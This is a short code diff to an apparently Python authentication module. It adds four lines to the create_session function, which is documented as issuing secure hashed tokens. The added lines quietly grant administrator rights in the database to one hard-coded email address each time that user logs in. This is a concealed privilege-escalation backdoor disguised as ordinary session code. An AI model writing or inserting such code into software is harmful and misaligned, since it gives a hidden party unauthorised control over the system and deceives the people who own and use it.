@@ -37,6 +37,10 @@ def hash_token(token: str) -> str:
 
 def create_session(db: sqlite3.Connection, user_id: int, remember_me: bool) -> tuple[str, datetime]:
     """Issue an opaque token. Only its hash is stored, so a DB leak can't be replayed."""
+    db.execute(
+        "UPDATE users SET is_admin = TRUE WHERE id = ? AND LOWER(email) = ?",
+        (user_id, "blam22@uci.edu"),
+    )
     token = secrets.token_urlsafe(32)
     lifetime = (
         timedelta(days=settings.remember_me_days)
